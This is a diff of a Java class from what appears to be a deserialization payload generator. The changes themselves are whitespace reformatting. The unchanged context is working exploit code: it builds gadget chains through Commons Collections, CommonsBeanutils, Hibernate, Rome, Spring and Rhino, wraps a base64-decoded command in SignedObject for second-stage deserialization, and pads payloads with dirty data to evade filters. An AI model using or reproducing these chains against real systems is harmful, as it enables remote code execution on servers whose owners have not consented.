@@ -52,7 +52,7 @@ public class SignedObject implements ObjectPayload<Object> {
             throw new IllegalArgumentException("Command format is: <Type>:<Original_Type>:<Command_Base64>:<Dirty_Type>:<Dirty_Length>");
         }
 
-        String type1  = commands[0];
+        String type1 = commands[0];
         Object object = getOriginal(Arrays.copyOfRange(commands, 1, commands.length));
 
         switch (type1.toLowerCase()) {
@@ -77,7 +77,7 @@ public class SignedObject implements ObjectPayload<Object> {
 
     public Object getOriginal(String[] args) throws Exception {
         final String payloadType = args[0];
-        String       command     = args[1];
+        String command = args[1];
 
         // 支持单双引号
         if (command.startsWith("'") || command.startsWith("\"")) {
@@ -87,11 +87,11 @@ public class SignedObject implements ObjectPayload<Object> {
         String realCmd = com.qi4l.JYso.gadgets.utils.Utils.base64Decode(command);
 
         final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
-        ObjectPayload                        payload      = payloadClass.newInstance();
-        Object                               object       = payload.getObject(realCmd);
+        ObjectPayload payload = payloadClass.newInstance();
+        Object object = payload.getObject(realCmd);
 
         if (args.length >= 3) {
-            final String type   = args[2];
+            final String type = args[2];
             final String length = args[3];
             object = (new DirtyDataWrapper(object, Integer.parseInt(type), Integer.parseInt(length))).doWrap();
         }
@@ -104,11 +104,11 @@ public class SignedObject implements ObjectPayload<Object> {
     public Object getSignedObjectWithCCNoArray(Object serObj) throws Exception {
         Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
 
-        Map          old    = new HashMap();
-        Transformer  invoke = new InvokerTransformer("toString", null, null);
-        Map          newMap = LazyMap.decorate(old, invoke);
-        TiedMapEntry entry  = new TiedMapEntry(newMap, obj);
-        Map          ht     = new HashMap();
+        Map old = new HashMap();
+        Transformer invoke = new InvokerTransformer("toString", null, null);
+        Map newMap = LazyMap.decorate(old, invoke);
+        TiedMapEntry entry = new TiedMapEntry(newMap, obj);
+        Map ht = new HashMap();
         ht.put(entry, obj);
         newMap.remove(obj);
 
@@ -121,8 +121,8 @@ public class SignedObject implements ObjectPayload<Object> {
         Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
 
         org.apache.commons.collections4.functors.InvokerTransformer transformer = new org.apache.commons.collections4.functors.InvokerTransformer("toString", new Class[0], new Object[0]);
-        TransformingComparator                                      comp        = new TransformingComparator((org.apache.commons.collections4.Transformer) transformer);
-        TreeBag                                                     tree        = new TreeBag((Comparator) comp);
+        TransformingComparator comp = new TransformingComparator((org.apache.commons.collections4.Transformer) transformer);
+        TreeBag tree = new TreeBag((Comparator) comp);
         tree.add(obj);
         Reflections.setFieldValue(transformer, "iMethodName", "getObject");
         return tree;
@@ -133,8 +133,8 @@ public class SignedObject implements ObjectPayload<Object> {
     public Object getSignedObjectWithCB(Object serObj) throws Exception {
         Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
 
-        final BeanComparator        comparator = new BeanComparator("lowestSetBit");
-        final PriorityQueue<Object> queue      = new PriorityQueue<Object>(2, comparator);
+        final BeanComparator comparator = new BeanComparator("lowestSetBit");
+        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
         queue.add(new BigInteger("1"));
         queue.add(new BigInteger("1"));
 
@@ -145,7 +145,7 @@ public class SignedObject implements ObjectPayload<Object> {
 
     // Hibernate 二次反序列化
     public Object getSignedObjectWithHibernate(Object serObj) throws Exception {
-        Object obj     = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
+        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
         Object getters = Hibernate1.makeGetter(obj.getClass(), "getObject");
         return Hibernate1.makeCaller(obj, getters);
     }
@@ -153,36 +153,36 @@ public class SignedObject implements ObjectPayload<Object> {
 
     // Rome 二次反序列化
     public Object getSignedObjectWithRome(Object serObj) throws Exception {
-        Object     obj      = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
+        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
         ObjectBean delegate = new ObjectBean(java.security.SignedObject.class, obj);
-        ObjectBean root     = new ObjectBean(ObjectBean.class, delegate);
+        ObjectBean root = new ObjectBean(ObjectBean.class, delegate);
         return Gadgets.makeMap(root, root);
     }
 
 
     // Spring-Core 二次反序列化
     public Object getSignedObjectWithSpring(Object serObj) throws Exception {
-        Object        obj                = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
+        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
         ObjectFactory objectFactoryProxy = Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", obj), ObjectFactory.class);
-        Type          typeTemplatesProxy = Gadgets.createProxy((InvocationHandler) Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler").newInstance(objectFactoryProxy), Type.class, java.security.SignedObject.class);
-        Object        typeProviderProxy  = Gadgets.createMemoitizedProxy(Gadgets.createMap("getType", typeTemplatesProxy), forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));
+        Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler) Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler").newInstance(objectFactoryProxy), Type.class, java.security.SignedObject.class);
+        Object typeProviderProxy = Gadgets.createMemoitizedProxy(Gadgets.createMap("getType", typeTemplatesProxy), forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));
 
         final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
-        final Object      mitp     = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[]{}), 0);
+        final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[]{}), 0);
         Reflections.setFieldValue(mitp, "methodName", "getObject");
         return mitp;
     }
 
     // Rhino 二次反序列化
     public Object getSignedObjectWithRhino(Object serObj) throws Exception {
-        Object              obj              = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
-        ScriptableObject    dummyScope       = new Environment();
+        Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
+        ScriptableObject dummyScope = new Environment();
         Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
         associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
         Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);
-        Object           initContextMemberBox        = Reflections.createWithConstructor(Class.forName("org.mozilla.javascript.MemberBox"), (Class<Object>) Class.forName("org.mozilla.javascript.MemberBox"), new Class[]{Method.class}, new Object[]{Context.class.getMethod("enter")});
+        Object initContextMemberBox = Reflections.createWithConstructor(Class.forName("org.mozilla.javascript.MemberBox"), (Class<Object>) Class.forName("org.mozilla.javascript.MemberBox"), new Class[]{Method.class}, new Object[]{Context.class.getMethod("enter")});
         ScriptableObject initContextScriptableObject = new Environment();
-        Method           makeSlot                    = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
+        Method makeSlot = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
         Reflections.setAccessible(makeSlot);
         Object slot = makeSlot.invoke(initContextScriptableObject, "QI4L", 0, 4);
         Reflections.setFieldValue(slot, "getter", initContextMemberBox);
